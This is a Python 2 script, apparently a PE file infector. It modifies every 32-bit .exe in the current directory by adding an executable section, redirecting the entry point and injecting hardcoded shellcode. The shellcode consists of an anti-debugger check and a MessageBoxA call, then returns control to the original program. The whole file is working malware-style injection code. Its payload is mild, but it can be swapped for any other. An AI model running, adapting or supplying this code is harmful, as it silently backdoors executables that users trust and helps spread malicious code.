import pefile
import mmap
import os
from binascii import unhexlify

def align(val_to_align, alignment):
  return ((val_to_align + alignment - 1) / alignment) * alignment

def insert_EP(ep):
  	ep = "%08x" % (oep+0x400000)
  	ep = "".join(reversed([ep[i:i+2] for i in range(0, len(ep), 2)]))
  	ep += "ffd0"
  	ep = unhexlify(ep)
  	return anticode+ ep + shellcode + ep
anticode = bytes (b"\x64\xA1\x30\x00\x00\x00\x8B\x40\x18\x8B\x40\x0C\x83\xF8\x02\x75\x0C\x64\xA1\x30\x00\x00\x00\x80\x78\x02\x00\x74\x07\xB8")
#https://blackcloud.me/Win32-shellcode-3/?fbclid=IwAR11HPhG6kBM7mg1v0HicPrHliQxGrA8ahbEH4SlQ-MJUBvdYxWHViC6WtM
shellcode = bytes(b"\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58"
				  b"\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41"
				  b"\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75"
				  b"\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e"
				  b"\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x51\x68\x61\x72"
				  b"\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x68\x6c\x6c"
				  b"\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55\x73\x65\x72"
				  b"\x54\xff\xd0\x68\x6f\x78\x41\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67\x65\x42"
				  b"\x68\x4d\x65\x73\x73\x54\x50\xff\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68\x30"
				  b"\x20\x20\x20\x68\x4e\x54\x32\x33\x89\xe7\x52\x68\x34\x34\x20\x20\x68\x35\x32"
				  b"\x31\x35\x68\x36\x2d\x31\x38\x68\x32\x31\x31\x35\x68\x2d\x31\x38\x35\x68\x30"
				  b"\x31\x38\x32\x68\x31\x38\x35\x32\x89\xe1\x52\x57\x51\x52\xff\xd0\x83\xc4\x10"
				  b"\x68\x65\x73\x73\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68\x45\x78"
				  b"\x69\x74\x54\x53\xff\xd5\x31\xc9\x51\xb8")

files = [f for f in os.listdir('.') if os.path.isfile(f)]
for f in files:
  	if ".exe" not in f:
		continue
	print "\n-----\t" + f + "\t-----"
	exe_path = f
  
	# STEP 0x01 - Resize the Executable
	print "\n[*] STEP 0x01 - Resize the Executable"

	original_size = os.path.getsize(exe_path)
	print "\t[+] Original Size = %d" % original_size
	fd = open(exe_path, 'a+b')
	map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
	map.resize(original_size + 0x2000)
	map.close()
	fd.close()

	print "\t[+] New Size = %d bytes\n" % os.path.getsize(exe_path)

	# STEP 0x02 - Add the New Section Header
	pe = pefile.PE(exe_path)

	if hex(pe.OPTIONAL_HEADER.Magic) == '0x20b':
		print "[*] FILE 64bit DETECTED"
		print "\tSkipping ..."
		continue

	print "[*] STEP 0x02 - Add the New Section Header"

	number_of_section = pe.FILE_HEADER.NumberOfSections
	last_section = number_of_section - 1
	file_alignment = pe.OPTIONAL_HEADER.FileAlignment
	section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
	new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

	# Look for valid values for the new section header
	raw_size = align(0x1000, file_alignment)
	virtual_size = align(0x1000, section_alignment)
	raw_offset = align((pe.sections[last_section].PointerToRawData +
	                	pe.sections[last_section].SizeOfRawData),
	                	file_alignment)

	virtual_offset = align((pe.sections[last_section].VirtualAddress +
	                    	pe.sections[last_section].Misc_VirtualSize),
	                   		section_alignment)

	# CODE | EXECUTE | READ | WRITE
	characteristics = 0xE0000020
	# Section name must be equal to 8 bytes
	name = ".xyz" + (4 * '\x00')

	# Create the section
	# Set the name
	pe.set_bytes_at_offset(new_section_offset, name)
	print "\t[+] Section Name = %s" % name
	# Set the virtual size
	pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
	print "\t[+] Virtual Size = %s" % hex(virtual_size)
	# Set the virtual offset
	pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
	print "\t[+] Virtual Offset = %s" % hex(virtual_offset)
	# Set the raw size
	pe.set_dword_at_offset(new_section_offset + 16, raw_size)
	print "\t[+] Raw Size = %s" % hex(raw_size)
	# Set the raw offset
	pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
	print "\t[+] Raw Offset = %s" % hex(raw_offset)
	# Set the following fields to zero
	pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
	# Set the characteristics
	pe.set_dword_at_offset(new_section_offset + 36, characteristics)
	print "\t[+] Characteristics = %s\n" % hex(characteristics)

	# STEP 0x03 - Modify the Main Headers
	print "[*] STEP 0x03 - Modify the Main Headers"
	pe.FILE_HEADER.NumberOfSections += 1
	print "\t[+] Number of Sections = %s" % pe.FILE_HEADER.NumberOfSections
	pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
	print "\t[+] Size of Image = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage

	pe.write(exe_path)

	pe = pefile.PE(exe_path)
	number_of_section = pe.FILE_HEADER.NumberOfSections
	last_section = number_of_section - 1
	new_ep = pe.sections[last_section].VirtualAddress
	print "\t[+] New Entry Point = %s" % hex(pe.sections[last_section].VirtualAddress)
	oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	print "\t[+] Original Entry Point = %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep

	# STEP 0x04 - Inject the Shellcode in the New Section
	print "[*] STEP 0x04 - Inject the Shellcode in the New Section"

	new_shell = insert_EP(oep)
	raw_offset = pe.sections[last_section].PointerToRawData
	pe.set_bytes_at_offset(raw_offset, new_shell)
	print "\t[+] Shellcode wrote in the new section"

	pe.write(exe_path)
